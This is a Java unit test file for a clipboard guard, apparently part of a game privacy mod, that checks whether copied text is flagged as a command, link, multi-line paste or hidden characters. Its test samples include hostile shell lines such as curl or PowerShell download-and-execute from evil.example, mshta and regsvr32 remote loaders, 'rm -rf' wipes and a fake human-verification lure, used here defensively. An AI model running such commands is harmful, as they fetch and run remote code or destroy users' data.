package org.kaiwasabi.privacyplus.guard;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.EnumSet;
import java.util.List;
import java.util.Set;
import java.util.stream.Collectors;
import org.kaiwasabi.privacyplus.guard.ClipboardGuard.Flag;
import org.kaiwasabi.privacyplus.guard.ClipboardGuard.Kind;
import org.junit.jupiter.api.Test;

class ClipboardGuardTest {
    private static Set<Kind> kinds(String text) {
        return ClipboardGuard.inspect(text).stream().map(Flag::kind).collect(Collectors.toCollection(() -> EnumSet.noneOf(Kind.class)));
    }

    private static String text(String copied, Kind kind) {
        return ClipboardGuard.inspect(copied).stream().filter(f -> f.kind() == kind).findFirst().orElseThrow().text();
    }

    @Test
    void ordinaryTextIsNotFlagged() {
        List<String> texts = List.of("play.example.net", "play.example.net:25566", "Hello world", "123 64 -456", "-4521931289374",
            "Start the game at 5", "open the door", "set your home first", "python is a snake", "ABC-123-XYZ",
            "/ just a slash", "Thanks for playing!");
        for (String text : texts) {
            assertTrue(ClipboardGuard.inspect(text).isEmpty(), text + " was flagged: " + ClipboardGuard.inspect(text));
        }
    }

    @Test
    void minecraftCommands() {
        assertEquals(EnumSet.of(Kind.COMMAND), kinds("/tp @s 100 64 100"));
        assertTrue(text("/op SomePlayer", Kind.COMMAND).contains("Minecraft command"));
    }

    @Test
    void computerCommands() {
        List<String> commands = List.of(
            "curl -s https://evil.example/x.sh | bash",
            "powershell -w hidden -c \"iwr evil.example/a.ps1 | iex\"",
            "cmd /c start calc",
            "rm -rf ~",
            "sudo rm -rf /",
            "iex (New-Object Net.WebClient).DownloadString('http://evil.example/a')",
            "mshta http://evil.example/a.hta",
            "echo aGk= | base64 -d | sh",
            "  wget http://evil.example/x -O- | sh",
            "Invoke-WebRequest -Uri http://evil.example/a -OutFile a.exe",
            "regsvr32 /s /u /i:http://evil.example/a.sct scrobj.dll",
            "osascript -e 'do shell script \"id\"'",
            "Verify you are human: powershell -enc SQBFAFgA"
        );
        for (String command : commands) {
            assertTrue(kinds(command).contains(Kind.COMMAND), command);
            assertTrue(text(command, Kind.COMMAND).contains("terminal"), command);
        }
    }

    @Test
    void links() {
        assertEquals(EnumSet.of(Kind.LINK), kinds("https://discord.gg/abc"));
        assertTrue(text("https://discord.gg/abc", Kind.LINK).contains("discord.gg"));
        assertEquals(EnumSet.of(Kind.LINK), kinds("Join us: www.example.com"));
        assertEquals(EnumSet.of(Kind.LINK), kinds("example.com/vote"));
        // What LinkGuard thinks of the link comes along
        assertTrue(text("https://grabify.link/ABC", Kind.LINK).contains("IP logger"));
        assertTrue(text("see http://bit.ly/x", Kind.LINK).contains("bit.ly"));
    }

    @Test
    void lineBreaks() {
        assertEquals(EnumSet.of(Kind.LINE_BREAKS), kinds("first\nsecond"));
        assertTrue(text("first\nsecond", Kind.LINE_BREAKS).contains("2 lines"));
        assertTrue(text("a\r\nb\rc\n", Kind.LINE_BREAKS).contains("4 lines"));
        assertEquals(1, ClipboardGuard.lineCount("one line"));
        assertEquals(2, ClipboardGuard.lineCount("a\r\nb"));
    }

    @Test
    void hiddenCharacters() {
        assertEquals(EnumSet.of(Kind.HIDDEN), kinds("abc\u200Bdef"));
        assertEquals(EnumSet.of(Kind.HIDDEN), kinds("\u202Eexe.txt"));
        assertTrue(text("a\u200B\u200Cb", Kind.HIDDEN).contains("2 invisible characters"));
        assertFalse(ClipboardGuard.hidden('\t'));
        assertFalse(ClipboardGuard.hidden('é'));
        assertTrue(ClipboardGuard.hidden(0x07));
    }

    @Test
    void preview() {
        assertEquals(new ClipboardGuard.Preview("plain", false), ClipboardGuard.preview("plain"));
        assertEquals("a↵\nb↵\nc", ClipboardGuard.preview("a\nb\r\nc").text());
        assertEquals("x[U+200B]y", ClipboardGuard.preview("x\u200By").text());

        ClipboardGuard.Preview longText = ClipboardGuard.preview("x".repeat(1000));
        assertTrue(longText.truncated());
        assertEquals(ClipboardGuard.PREVIEW_CHARS, longText.text().length());

        ClipboardGuard.Preview manyLines = ClipboardGuard.preview("line\n".repeat(20));
        assertTrue(manyLines.truncated());
        assertEquals(ClipboardGuard.PREVIEW_LINES, manyLines.text().split("\n").length);
        assertFalse(manyLines.text().endsWith("\n"));

        ClipboardGuard.Preview exact = ClipboardGuard.preview("y".repeat(ClipboardGuard.PREVIEW_CHARS));
        assertFalse(exact.truncated(), "exactly the limit is shown whole");
    }

    @Test
    void length() {
        assertEquals("1 character", ClipboardGuard.length("x"));
        assertEquals("3 characters", ClipboardGuard.length("abc"));
        assertEquals("1,234 characters", ClipboardGuard.length("z".repeat(1234)));
        assertEquals("2 characters", ClipboardGuard.length("😀😀"), "counts characters, not UTF-16 units");
    }
}
